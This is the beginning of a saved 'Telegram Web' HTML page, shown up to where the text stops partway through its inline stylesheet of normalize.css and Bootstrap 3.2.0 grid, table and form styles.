﻿<!DOCTYPE html><html manifest="webogram.appcache" ng-csp="" xmlns:ng="http://angularjs.org" id="ng-app" style="display: block; background: rgb(231, 235, 240) none repeat scroll 0% 0%;" lang="en"><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"><title>Telegram Web</title><style data-savepage-href="css/app.css">@charset "UTF-8";
.ng-cloak,.ng-hide:not(.ng-hide-animate),.x-ng-cloak,[data-ng-cloak],[ng-cloak],[ng\:cloak],[x-ng-cloak]{display:none!important}
ng\:form{display:block}
.ng-animate-shim{visibility:hidden}
.ng-anchor{position:absolute}
/*!
 * Bootstrap v3.2.0 (http://getbootstrap.com)
 * Copyright 2011-2014 Twitter, Inc.
 * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
 */
/*!
 * Generated using the Bootstrap Customizer (http://getbootstrap.com/customize/?id=ef8b2e1e74a6ba7423f1)
 * Config saved to config.json and https://gist.github.com/ef8b2e1e74a6ba7423f1
 */
/*! normalize.css v3.0.1 | MIT License | git.io/normalize */
html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}
body{margin:0}
article,aside,details,figcaption,figure,footer,header,hgroup,main,nav,section,summary{display:block}
audio,canvas,progress,video{display:inline-block;vertical-align:baseline}
audio:not([controls]){display:none;height:0}
[hidden],template{display:none}
a{background:0 0}
a:active,a:hover{outline:0}
b,strong{font-weight:700}
dfn{font-style:italic}
h1{margin:.67em 0}
mark{background:#ff0;color:#000}
sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}
sup{top:-.5em}
sub{bottom:-.25em}
img{border:0}
svg:not(:root){overflow:hidden}
hr{-moz-box-sizing:content-box;box-sizing:content-box;height:0}
code,kbd,pre,samp{font-size:1em}
button,input,optgroup,select,textarea{color:inherit;font:inherit;margin:0}
button{overflow:visible}
button,select{text-transform:none}
button,html input[type=button],input[type=reset],input[type=submit]{-webkit-appearance:button;cursor:pointer}
button[disabled],html input[disabled]{cursor:default}
button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}
input[type=checkbox],input[type=radio]{box-sizing:border-box;padding:0}
input[type=number]::-webkit-inner-spin-button,input[type=number]::-webkit-outer-spin-button{height:auto}
input[type=search]::-webkit-search-cancel-button,input[type=search]::-webkit-search-decoration{-webkit-appearance:none}
textarea{overflow:auto}
optgroup{font-weight:700}
table{border-collapse:collapse;border-spacing:0}
td,th{padding:0}
@media print{*{text-shadow:none!important;color:#000!important;background:0 0!important;box-shadow:none!important}
a,a:visited{text-decoration:underline}
a[href]:after{content:" (" attr(href) ")"}
abbr[title]:after{content:" (" attr(title) ")"}
a[href^="javascript:"]:after,a[href^="#"]:after{content:""}
blockquote,pre{border:1px solid #999;page-break-inside:avoid}
thead{display:table-header-group}
img,tr{page-break-inside:avoid}
img{max-width:100%!important}
h2,h3,p{orphans:3;widows:3}
h2,h3{page-break-after:avoid}
select{background:#fff!important}
.navbar{display:none}
.table td,.table th{background-color:#fff!important}
.btn>.caret,.dropup>.btn>.caret{border-top-color:#000!important}
.label{border:1px solid #000}
.table{border-collapse:collapse!important}
.table-bordered td,.table-bordered th{border:1px solid #ddd!important}}
*,:after,:before{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}
html{font-size:10px;-webkit-tap-highlight-color:transparent}
body{line-height:1.42857143;background-color:#fff}
button,input,select,textarea{font-family:inherit;font-size:inherit;line-height:inherit}
a{color:#3a6d99;text-decoration:none}
a:focus,a:hover{color:#3a6d99;text-decoration:underline}
a:focus{outline:dotted thin;outline:-webkit-focus-ring-color auto 5px;outline-offset:-2px}
figure{margin:0}
img{vertical-align:middle}
.carousel-inner>.item>a>img,.carousel-inner>.item>img,.img-responsive,.thumbnail a>img,.thumbnail>img{display:block;max-width:100%;height:auto}
.img-rounded{border-radius:6px}
.img-thumbnail{padding:4px;line-height:1.42857143;background-color:#fff;border:1px solid #ddd;border-radius:4px;-webkit-transition:all .2s ease-in-out;-o-transition:all .2s ease-in-out;transition:all .2s ease-in-out;display:inline-block;max-width:100%;height:auto}
.img-circle{border-radius:50%}
hr{margin-top:20px;margin-bottom:20px;border:0;border-top:1px solid #eee}
.sr-only{position:absolute;width:1px;height:1px;margin:-1px;padding:0;overflow:hidden;clip:rect(0,0,0,0);border:0}
.sr-only-focusable:active,.sr-only-focusable:focus{position:static;width:auto;height:auto;margin:0;overflow:visible;clip:auto}
.h1,.h2,.h3,.h4,.h5,.h6,h1,h2,h3,h4,h5,h6{font-family:inherit;font-weight:500;line-height:1.1;color:inherit}
.h1 .small,.h1 small,.h2 .small,.h2 small,.h3 .small,.h3 small,.h4 .small,.h4 small,.h5 .small,.h5 small,.h6 .small,.h6 small,h1 .small,h1 small,h2 .small,h2 small,h3 .small,h3 small,h4 .small,h4 small,h5 .small,h5 small,h6 .small,h6 small{font-weight:400;line-height:1;color:#999}
.h1,.h2,.h3,h1,h2,h3{margin-top:20px;margin-bottom:10px}
.h1 .small,.h1 small,.h2 .small,.h2 small,.h3 .small,.h3 small,h1 .small,h1 small,h2 .small,h2 small,h3 .small,h3 small{font-size:65%}
.h4,.h5,.h6,h4,h5,h6{margin-top:10px;margin-bottom:10px}
.h4 .small,.h4 small,.h5 .small,.h5 small,.h6 .small,.h6 small,h4 .small,h4 small,h5 .small,h5 small,h6 .small,h6 small{font-size:75%}
.h1,h1{font-size:36px}
.h2,h2{font-size:30px}
.h3,h3{font-size:24px}
.h4,h4{font-size:18px}
.h5,h5{font-size:14px}
.h6,h6{font-size:12px}
p{margin:0 0 10px}
.lead{margin-bottom:20px;font-size:16px;font-weight:300;line-height:1.4}
@media (min-width:768px){.lead{font-size:21px}}
.small,small{font-size:85%}
cite{font-style:normal}
.mark,mark{background-color:#fcf8e3;padding:.2em}
.text-left{text-align:left}
.text-right{text-align:right}
.text-center{text-align:center}
.text-justify{text-align:justify}
.text-nowrap{white-space:nowrap}
.text-lowercase{text-transform:lowercase}
.text-uppercase{text-transform:uppercase}
.text-capitalize{text-transform:capitalize}
.text-muted{color:#999}
.text-primary{color:#5d8db3}
a.text-primary:hover{color:#477396}
.text-success{color:#3c763d}
a.text-success:hover{color:#2b542c}
.text-info{color:#31708f}
a.text-info:hover{color:#245269}
.text-warning{color:#8a6d3b}
a.text-warning:hover{color:#66512c}
.text-danger{color:#a94442}
a.text-danger:hover{color:#843534}
.bg-primary{color:#fff;background-color:#5d8db3}
a.bg-primary:hover{background-color:#477396}
.bg-success{background-color:#dff0d8}
a.bg-success:hover{background-color:#c1e2b3}
.bg-info{background-color:#d9edf7}
a.bg-info:hover{background-color:#afd9ee}
.bg-warning{background-color:#fcf8e3}
a.bg-warning:hover{background-color:#f7ecb5}
.bg-danger{background-color:#f2dede}
a.bg-danger:hover{background-color:#e4b9b9}
.page-header{padding-bottom:9px;margin:40px 0 20px;border-bottom:1px solid #eee}
ol,ul{margin-top:0;margin-bottom:10px}
ol ol,ol ul,ul ol,ul ul{margin-bottom:0}
.list-unstyled{padding-left:0;list-style:none}
.list-inline{padding-left:0;list-style:none;margin-left:-5px}
.list-inline>li{display:inline-block;padding-left:5px;padding-right:5px}
dl{margin-top:0;margin-bottom:20px}
dd,dt{line-height:1.42857143}
dt{font-weight:700}
dd{margin-left:0}
@media (min-width:480px){.dl-horizontal dt{float:left;width:160px;clear:left;text-align:right;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.dl-horizontal dd{margin-left:180px}}
abbr[data-original-title],abbr[title]{cursor:help;border-bottom:1px dotted #999}
.initialism{font-size:90%;text-transform:uppercase}
blockquote{padding:10px 20px;margin:0 0 20px;font-size:17.5px;border-left:5px solid #eee}
blockquote ol:last-child,blockquote p:last-child,blockquote ul:last-child{margin-bottom:0}
blockquote .small,blockquote footer,blockquote small{display:block;font-size:80%;line-height:1.42857143;color:#999}
blockquote .small:before,blockquote footer:before,blockquote small:before{content:'\2014 \00A0'}
.blockquote-reverse,blockquote.pull-right{padding-right:15px;padding-left:0;border-right:5px solid #eee;border-left:0;text-align:right}
.blockquote-reverse .small:before,.blockquote-reverse footer:before,.blockquote-reverse small:before,blockquote.pull-right .small:before,blockquote.pull-right footer:before,blockquote.pull-right small:before{content:''}
.blockquote-reverse .small:after,.blockquote-reverse footer:after,.blockquote-reverse small:after,blockquote.pull-right .small:after,blockquote.pull-right footer:after,blockquote.pull-right small:after{content:'\00A0 \2014'}
blockquote:after,blockquote:before{content:""}
address{margin-bottom:20px;font-style:normal;line-height:1.42857143}
code,kbd,pre,samp{font-family:Menlo,Monaco,Consolas,"Courier New",monospace}
code{padding:2px 4px;font-size:90%;color:#c7254e;background-color:#f9f2f4;border-radius:4px}
kbd{padding:2px 4px;font-size:90%;color:#fff;background-color:#333;border-radius:3px;box-shadow:inset 0 -1px 0 rgba(0,0,0,.25)}
kbd kbd{padding:0;font-size:100%;box-shadow:none}
pre{display:block;margin:0 0 10px;line-height:1.42857143;word-break:break-all;word-wrap:break-word;color:#333;background-color:#f5f5f5;border-radius:4px}
pre code{padding:0;font-size:inherit;color:inherit;white-space:pre-wrap;background-color:transparent;border-radius:0}
.pre-scrollable{max-height:340px;overflow-y:scroll}
.container,.container-fluid{margin-right:auto;margin-left:auto;padding-left:0;padding-right:0}
@media (min-width:768px){.container{width:720px}}
@media (min-width:992px){.container{width:940px}}
@media (min-width:1200px){.container{width:1140px}}
.row{margin-left:0;margin-right:0}
.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-2,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9{position:relative;min-height:1px;padding-left:0;padding-right:0}
.col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-2,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9{float:left}
.col-xs-12{width:100%}
.col-xs-11{width:91.66666667%}
.col-xs-10{width:83.33333333%}
.col-xs-9{width:75%}
.col-xs-8{width:66.66666667%}
.col-xs-7{width:58.33333333%}
.col-xs-6{width:50%}
.col-xs-5{width:41.66666667%}
.col-xs-4{width:33.33333333%}
.col-xs-3{width:25%}
.col-xs-2{width:16.66666667%}
.col-xs-1{width:8.33333333%}
.col-xs-pull-12{right:100%}
.col-xs-pull-11{right:91.66666667%}
.col-xs-pull-10{right:83.33333333%}
.col-xs-pull-9{right:75%}
.col-xs-pull-8{right:66.66666667%}
.col-xs-pull-7{right:58.33333333%}
.col-xs-pull-6{right:50%}
.col-xs-pull-5{right:41.66666667%}
.col-xs-pull-4{right:33.33333333%}
.col-xs-pull-3{right:25%}
.col-xs-pull-2{right:16.66666667%}
.col-xs-pull-1{right:8.33333333%}
.col-xs-pull-0{right:auto}
.col-xs-push-12{left:100%}
.col-xs-push-11{left:91.66666667%}
.col-xs-push-10{left:83.33333333%}
.col-xs-push-9{left:75%}
.col-xs-push-8{left:66.66666667%}
.col-xs-push-7{left:58.33333333%}
.col-xs-push-6{left:50%}
.col-xs-push-5{left:41.66666667%}
.col-xs-push-4{left:33.33333333%}
.col-xs-push-3{left:25%}
.col-xs-push-2{left:16.66666667%}
.col-xs-push-1{left:8.33333333%}
.col-xs-push-0{left:auto}
.col-xs-offset-12{margin-left:100%}
.col-xs-offset-11{margin-left:91.66666667%}
.col-xs-offset-10{margin-left:83.33333333%}
.col-xs-offset-9{margin-left:75%}
.col-xs-offset-8{margin-left:66.66666667%}
.col-xs-offset-7{margin-left:58.33333333%}
.col-xs-offset-6{margin-left:50%}
.col-xs-offset-5{margin-left:41.66666667%}
.col-xs-offset-4{margin-left:33.33333333%}
.col-xs-offset-3{margin-left:25%}
.col-xs-offset-2{margin-left:16.66666667%}
.col-xs-offset-1{margin-left:8.33333333%}
.col-xs-offset-0{margin-left:0}
@media (min-width:768px){.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9{float:left}
.col-sm-12{width:100%}
.col-sm-11{width:91.66666667%}
.col-sm-10{width:83.33333333%}
.col-sm-9{width:75%}
.col-sm-8{width:66.66666667%}
.col-sm-7{width:58.33333333%}
.col-sm-6{width:50%}
.col-sm-5{width:41.66666667%}
.col-sm-4{width:33.33333333%}
.col-sm-3{width:25%}
.col-sm-2{width:16.66666667%}
.col-sm-1{width:8.33333333%}
.col-sm-pull-12{right:100%}
.col-sm-pull-11{right:91.66666667%}
.col-sm-pull-10{right:83.33333333%}
.col-sm-pull-9{right:75%}
.col-sm-pull-8{right:66.66666667%}
.col-sm-pull-7{right:58.33333333%}
.col-sm-pull-6{right:50%}
.col-sm-pull-5{right:41.66666667%}
.col-sm-pull-4{right:33.33333333%}
.col-sm-pull-3{right:25%}
.col-sm-pull-2{right:16.66666667%}
.col-sm-pull-1{right:8.33333333%}
.col-sm-pull-0{right:auto}
.col-sm-push-12{left:100%}
.col-sm-push-11{left:91.66666667%}
.col-sm-push-10{left:83.33333333%}
.col-sm-push-9{left:75%}
.col-sm-push-8{left:66.66666667%}
.col-sm-push-7{left:58.33333333%}
.col-sm-push-6{left:50%}
.col-sm-push-5{left:41.66666667%}
.col-sm-push-4{left:33.33333333%}
.col-sm-push-3{left:25%}
.col-sm-push-2{left:16.66666667%}
.col-sm-push-1{left:8.33333333%}
.col-sm-push-0{left:auto}
.col-sm-offset-12{margin-left:100%}
.col-sm-offset-11{margin-left:91.66666667%}
.col-sm-offset-10{margin-left:83.33333333%}
.col-sm-offset-9{margin-left:75%}
.col-sm-offset-8{margin-left:66.66666667%}
.col-sm-offset-7{margin-left:58.33333333%}
.col-sm-offset-6{margin-left:50%}
.col-sm-offset-5{margin-left:41.66666667%}
.col-sm-offset-4{margin-left:33.33333333%}
.col-sm-offset-3{margin-left:25%}
.col-sm-offset-2{margin-left:16.66666667%}
.col-sm-offset-1{margin-left:8.33333333%}
.col-sm-offset-0{margin-left:0}}
@media (min-width:992px){.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9{float:left}
.col-md-12{width:100%}
.col-md-11{width:91.66666667%}
.col-md-10{width:83.33333333%}
.col-md-9{width:75%}
.col-md-8{width:66.66666667%}
.col-md-7{width:58.33333333%}
.col-md-6{width:50%}
.col-md-5{width:41.66666667%}
.col-md-4{width:33.33333333%}
.col-md-3{width:25%}
.col-md-2{width:16.66666667%}
.col-md-1{width:8.33333333%}
.col-md-pull-12{right:100%}
.col-md-pull-11{right:91.66666667%}
.col-md-pull-10{right:83.33333333%}
.col-md-pull-9{right:75%}
.col-md-pull-8{right:66.66666667%}
.col-md-pull-7{right:58.33333333%}
.col-md-pull-6{right:50%}
.col-md-pull-5{right:41.66666667%}
.col-md-pull-4{right:33.33333333%}
.col-md-pull-3{right:25%}
.col-md-pull-2{right:16.66666667%}
.col-md-pull-1{right:8.33333333%}
.col-md-pull-0{right:auto}
.col-md-push-12{left:100%}
.col-md-push-11{left:91.66666667%}
.col-md-push-10{left:83.33333333%}
.col-md-push-9{left:75%}
.col-md-push-8{left:66.66666667%}
.col-md-push-7{left:58.33333333%}
.col-md-push-6{left:50%}
.col-md-push-5{left:41.66666667%}
.col-md-push-4{left:33.33333333%}
.col-md-push-3{left:25%}
.col-md-push-2{left:16.66666667%}
.col-md-push-1{left:8.33333333%}
.col-md-push-0{left:auto}
.col-md-offset-12{margin-left:100%}
.col-md-offset-11{margin-left:91.66666667%}
.col-md-offset-10{margin-left:83.33333333%}
.col-md-offset-9{margin-left:75%}
.col-md-offset-8{margin-left:66.66666667%}
.col-md-offset-7{margin-left:58.33333333%}
.col-md-offset-6{margin-left:50%}
.col-md-offset-5{margin-left:41.66666667%}
.col-md-offset-4{margin-left:33.33333333%}
.col-md-offset-3{margin-left:25%}
.col-md-offset-2{margin-left:16.66666667%}
.col-md-offset-1{margin-left:8.33333333%}
.col-md-offset-0{margin-left:0}}
@media (min-width:1200px){.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9{float:left}
.col-lg-12{width:100%}
.col-lg-11{width:91.66666667%}
.col-lg-10{width:83.33333333%}
.col-lg-9{width:75%}
.col-lg-8{width:66.66666667%}
.col-lg-7{width:58.33333333%}
.col-lg-6{width:50%}
.col-lg-5{width:41.66666667%}
.col-lg-4{width:33.33333333%}
.col-lg-3{width:25%}
.col-lg-2{width:16.66666667%}
.col-lg-1{width:8.33333333%}
.col-lg-pull-12{right:100%}
.col-lg-pull-11{right:91.66666667%}
.col-lg-pull-10{right:83.33333333%}
.col-lg-pull-9{right:75%}
.col-lg-pull-8{right:66.66666667%}
.col-lg-pull-7{right:58.33333333%}
.col-lg-pull-6{right:50%}
.col-lg-pull-5{right:41.66666667%}
.col-lg-pull-4{right:33.33333333%}
.col-lg-pull-3{right:25%}
.col-lg-pull-2{right:16.66666667%}
.col-lg-pull-1{right:8.33333333%}
.col-lg-pull-0{right:auto}
.col-lg-push-12{left:100%}
.col-lg-push-11{left:91.66666667%}
.col-lg-push-10{left:83.33333333%}
.col-lg-push-9{left:75%}
.col-lg-push-8{left:66.66666667%}
.col-lg-push-7{left:58.33333333%}
.col-lg-push-6{left:50%}
.col-lg-push-5{left:41.66666667%}
.col-lg-push-4{left:33.33333333%}
.col-lg-push-3{left:25%}
.col-lg-push-2{left:16.66666667%}
.col-lg-push-1{left:8.33333333%}
.col-lg-push-0{left:auto}
.col-lg-offset-12{margin-left:100%}
.col-lg-offset-11{margin-left:91.66666667%}
.col-lg-offset-10{margin-left:83.33333333%}
.col-lg-offset-9{margin-left:75%}
.col-lg-offset-8{margin-left:66.66666667%}
.col-lg-offset-7{margin-left:58.33333333%}
.col-lg-offset-6{margin-left:50%}
.col-lg-offset-5{margin-left:41.66666667%}
.col-lg-offset-4{margin-left:33.33333333%}
.col-lg-offset-3{margin-left:25%}
.col-lg-offset-2{margin-left:16.66666667%}
.col-lg-offset-1{margin-left:8.33333333%}
.col-lg-offset-0{margin-left:0}}
table{background-color:transparent}
th{text-align:left}
.table{width:100%;max-width:100%;margin-bottom:20px}
.table>tbody>tr>td,.table>tbody>tr>th,.table>tfoot>tr>td,.table>tfoot>tr>th,.table>thead>tr>td,.table>thead>tr>th{padding:8px;line-height:1.42857143;vertical-align:top;border-top:1px solid #ddd}
.table>thead>tr>th{vertical-align:bottom;border-bottom:2px solid #ddd}
.table>caption+thead>tr:first-child>td,.table>caption+thead>tr:first-child>th,.table>colgroup+thead>tr:first-child>td,.table>colgroup+thead>tr:first-child>th,.table>thead:first-child>tr:first-child>td,.table>thead:first-child>tr:first-child>th{border-top:0}
.table>tbody+tbody{border-top:2px solid #ddd}
.table .table{background-color:#fff}
.table-condensed>tbody>tr>td,.table-condensed>tbody>tr>th,.table-condensed>tfoot>tr>td,.table-condensed>tfoot>tr>th,.table-condensed>thead>tr>td,.table-condensed>thead>tr>th{padding:5px}
.table-bordered,.table-bordered>tbody>tr>td,.table-bordered>tbody>tr>th,.table-bordered>tfoot>tr>td,.table-bordered>tfoot>tr>th,.table-bordered>thead>tr>td,.table-bordered>thead>tr>th{border:1px solid #ddd}
.table-bordered>thead>tr>td,.table-bordered>thead>tr>th{border-bottom-width:2px}
.table-striped>tbody>tr:nth-child(odd)>td,.table-striped>tbody>tr:nth-child(odd)>th{background-color:#f9f9f9}
.table-hover>tbody>tr:hover>td,.table-hover>tbody>tr:hover>th{background-color:#f5f5f5}
table col[class*=col-]{position:static;float:none;display:table-column}
table td[class*=col-],table th[class*=col-]{position:static;float:none;display:table-cell}
.table>tbody>tr.active>td,.table>tbody>tr.active>th,.table>tbody>tr>td.active,.table>tbody>tr>th.active,.table>tfoot>tr.active>td,.table>tfoot>tr.active>th,.table>tfoot>tr>td.active,.table>tfoot>tr>th.active,.table>thead>tr.active>td,.table>thead>tr.active>th,.table>thead>tr>td.active,.table>thead>tr>th.active{background-color:#f5f5f5}
.table-hover>tbody>tr.active:hover>td,.table-hover>tbody>tr.active:hover>th,.table-hover>tbody>tr:hover>.active,.table-hover>tbody>tr>td.active:hover,.table-hover>tbody>tr>th.active:hover{background-color:#e8e8e8}
.table>tbody>tr.success>td,.table>tbody>tr.success>th,.table>tbody>tr>td.success,.table>tbody>tr>th.success,.table>tfoot>tr.success>td,.table>tfoot>tr.success>th,.table>tfoot>tr>td.success,.table>tfoot>tr>th.success,.table>thead>tr.success>td,.table>thead>tr.success>th,.table>thead>tr>td.success,.table>thead>tr>th.success{background-color:#dff0d8}
.table-hover>tbody>tr.success:hover>td,.table-hover>tbody>tr.success:hover>th,.table-hover>tbody>tr:hover>.success,.table-hover>tbody>tr>td.success:hover,.table-hover>tbody>tr>th.success:hover{background-color:#d0e9c6}
.table>tbody>tr.info>td,.table>tbody>tr.info>th,.table>tbody>tr>td.info,.table>tbody>tr>th.info,.table>tfoot>tr.info>td,.table>tfoot>tr.info>th,.table>tfoot>tr>td.info,.table>tfoot>tr>th.info,.table>thead>tr.info>td,.table>thead>tr.info>th,.table>thead>tr>td.info,.table>thead>tr>th.info{background-color:#d9edf7}
.table-hover>tbody>tr.info:hover>td,.table-hover>tbody>tr.info:hover>th,.table-hover>tbody>tr:hover>.info,.table-hover>tbody>tr>td.info:hover,.table-hover>tbody>tr>th.info:hover{background-color:#c4e3f3}
.table>tbody>tr.warning>td,.table>tbody>tr.warning>th,.table>tbody>tr>td.warning,.table>tbody>tr>th.warning,.table>tfoot>tr.warning>td,.table>tfoot>tr.warning>th,.table>tfoot>tr>td.warning,.table>tfoot>tr>th.warning,.table>thead>tr.warning>td,.table>thead>tr.warning>th,.table>thead>tr>td.warning,.table>thead>tr>th.warning{background-color:#fcf8e3}
.table-hover>tbody>tr.warning:hover>td,.table-hover>tbody>tr.warning:hover>th,.table-hover>tbody>tr:hover>.warning,.table-hover>tbody>tr>td.warning:hover,.table-hover>tbody>tr>th.warning:hover{background-color:#faf2cc}
.table>tbody>tr.danger>td,.table>tbody>tr.danger>th,.table>tbody>tr>td.danger,.table>tbody>tr>th.danger,.table>tfoot>tr.danger>td,.table>tfoot>tr.danger>th,.table>tfoot>tr>td.danger,.table>tfoot>tr>th.danger,.table>thead>tr.danger>td,.table>thead>tr.danger>th,.table>thead>tr>td.danger,.table>thead>tr>th.danger{background-color:#f2dede}
.table-hover>tbody>tr.danger:hover>td,.table-hover>tbody>tr.danger:hover>th,.table-hover>tbody>tr:hover>.danger,.table-hover>tbody>tr>td.danger:hover,.table-hover>tbody>tr>th.danger:hover{background-color:#ebcccc}
@media screen and (max-width:767px){.table-responsive{width:100%;margin-bottom:15px;overflow-y:hidden;overflow-x:auto;-ms-overflow-style:-ms-autohiding-scrollbar;border:1px solid #ddd;-webkit-overflow-scrolling:touch}
.table-responsive>.table{margin-bottom:0}
.table-responsive>.table>tbody>tr>td,.table-responsive>.table>tbody>tr>th,.table-responsive>.table>tfoot>tr>td,.table-responsive>.table>tfoot>tr>th,.table-responsive>.table>thead>tr>td,.table-responsive>.table>thead>tr>th{white-space:nowrap}
.table-responsive>.table-bordered{border:0}
.table-responsive>.table-bordered>tbody>tr>td:first-child,.table-responsive>.table-bordered>tbody>tr>th:first-child,.table-responsive>.table-bordered>tfoot>tr>td:first-child,.table-responsive>.table-bordered>tfoot>tr>th:first-child,.table-responsive>.table-bordered>thead>tr>td:first-child,.table-responsive>.table-bordered>thead>tr>th:first-child{border-left:0}
.table-responsive>.table-bordered>tbody>tr>td:last-child,.table-responsive>.table-bordered>tbody>tr>th:last-child,.table-responsive>.table-bordered>tfoot>tr>td:last-child,.table-responsive>.table-bordered>tfoot>tr>th:last-child,.table-responsive>.table-bordered>thead>tr>td:last-child,.table-responsive>.table-bordered>thead>tr>th:last-child{border-right:0}
.table-responsive>.table-bordered>tbody>tr:last-child>td,.table-responsive>.table-bordered>tbody>tr:last-child>th,.table-responsive>.table-bordered>tfoot>tr:last-child>td,.table-responsive>.table-bordered>tfoot>tr:last-child>th{border-bottom:0}}
fieldset{padding:0;margin:0;border:0;min-width:0}
legend{display:block;width:100%;padding:0;margin-bottom:20px;font-size:21px;line-height:inherit;color:#333;border:0;border-bottom:1px solid #e5e5e5}
label{display:inline-block;max-width:100%;margin-bottom:5px;font-weight:700}
input[type=search]{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}
input[type=checkbox],input[type=radio]{margin:4px 0 0;line-height:normal}
input[type=file]{display:block}
input[type=range]{display:block;width:100%}
select[multiple],select[size]{height:auto}
input[type=file]:focus,input[type=checkbox]:focus,input[type=radio]:focus{outline:dotted thin;outline:-webkit-focus-ring-color auto 5px;outline-offset:-2px}
output{display:block;padding-top:7px;font-size:14px;line-height:1.42857143;color:#000}
.form-control{display:block;width:100%;height:34px;padding:6px 12px;font-size:14px;line-height:1.42857143;color:#000;background-color:#fff;background-image:none;-o-transition:border-color ease-in-out .15s,box-shadow ease-in-out .15s}
.form-control::-moz-placeholder{color:#9aa2ab;opacity:1}
.form-control:-ms-input-placeholder{color:#9aa2ab}
.form-control::-webkit-input-placeholder{color:#9aa2ab}
.form-control[disabled],.form-control[readonly],fieldset[disabled] .form-control{cursor:not-allowed;background-color:#eee;opacity:1}
textarea.form-control{height:auto}
input[type=search]{-webkit-appearance:none}
input[type=date],input[type=time],input[type=datetime-local],input[type=month]{line-height:34px;line-height:1.42857143 \0}
input[type=date].input-sm,input[type=time].input-sm,input[type=datetime-local].input-sm,input[type=month].input-sm{line-height:30px}
input[type=date].input-lg,input[type=time].input-lg,input[type=datetime-local].input-lg,input[type=month].input-lg{line-height:46px}
.form-group{margin-bottom:15px}
.checkbox,.radio{position:relative;display:block;min-height:20px;margin-top:10px;margin-bottom:10px}
.checkbox label,.radio label{padding-left:20px;margin-bottom:0;font-weight:400;cursor:pointer}
.checkbox input[type=checkbox],.checkbox-inline input[type=checkbox],.radio input[type=radio],.radio-inline input[type=radio]{position:absolute;margin-left:-20px}
.checkbox+.checkbox,.radio+.radio{margin-top:-5px}
.checkbox-inline,.radio-inline{display:inline-block;padding-left:20px;margin-bottom:0;vertical-align:middle;font-weight:400;cursor:pointer}
.checkbox-inline+.checkbox-inline,.radio-inline+.radio-inline{margin-top:0;margin-left:10px}
.checkbox-inline.disabled,.checkbox.disabled label,.radio-inline.disabled,.radio.disabled label,fieldset[disabled] .checkbox label,fieldset[disabled] .checkbox-inline,fieldset[disabled] .radio label,fieldset[disabled] .radio-inline,fieldset[disabled] input[type=checkbox],fieldset[disabled] input[type=radio],input[type=checkbox].disabled,input[type=checkbox][disabled],input[type=radio].disabled,input[type=radio][disabled]{cursor:not-allowed}
.form-control-static{padding-top:7px;padding-bottom:7px;margin-bottom:0}
.form-control-static.input-lg,.form-control-static.input-sm{padding-left:0;padding-right:0}
.form-horizontal .form-group-sm .form-control,.input-sm{height:30px;padding:5px 10px;font-size:12px;line-height:1.5;border-radius:3px}
select.input-sm{height:30px;line-height:30px}
select[multiple].input-sm,textarea.input-sm{height:auto}
.form-horizontal .form-group-lg .form-control,.input-lg{height:46px;padding:10px 16px;font-size:18px;line-height:1.33;border-radius:6px}
select.input-lg{height:46px;line-height:46px}
select[multiple].input-lg,textarea.input-lg{height:auto}
.has-feedback{position:relative}
.has-feedback .form-control{padding-right:42.5px}
.form-control-feedback{position:absolute;top:25px;right:0;z-index:2;display:block;width:34px;height:34px;line-height:34px;text-align:center}
.input-lg+.form-control-feedback{width:46px;height:46px;line-height:46px}
.input-sm+.form-control-feedback{width:30px;height:30px;line-height:30px}
.has-success .checkbox,.has-success .checkbox-inline,.has-success .control-label,.has-success .help-block,.has-success .radio,.has-success .radio-inline{color:#3c763d}
.has-success .form-control{border-color:#3c763d;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.075);box-shadow:inset 0 1px 1px rgba(0,0,0,.075)}
.has-success .form-control:focus{border-color:#2b542c;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.075),0 0 6px #67b168;box-shadow:inset 0 1px 1px rgba(0,0,0,.075),0 0 6px #67b168}
.has-success .input-group-addon{color:#3c763d;border-color:#3c763d;background-color:#dff0d8}
.has-success .form-control-feedback{color:#3c763d}
.has-warning .checkbox,.has-warning .checkbox-inline,.has-warning .control-label,.has-warning .help-block,.has-warning .radio,.has-warning .radio-inline{color:#8a6d3b}
.has-warning .form-control{border-color:#8a6d3b;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.075);box-shadow:inset 0 1px 1px rgba(0,0,0,.075)}
.has-warning .form-control:focus{border-color:#66512c;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.075),0 0 6px #c0a16b;box-shadow:inset 0 1px 1px rgba(0,0,0,.075),0 0 6px #c0a16b}
.has-warning .input-group-addon{color:#8a6d3b;border-color:#8a6d3b;background-color:#fcf8e3}
.has-warning .form-control-feedback{color:#8a6d3b}
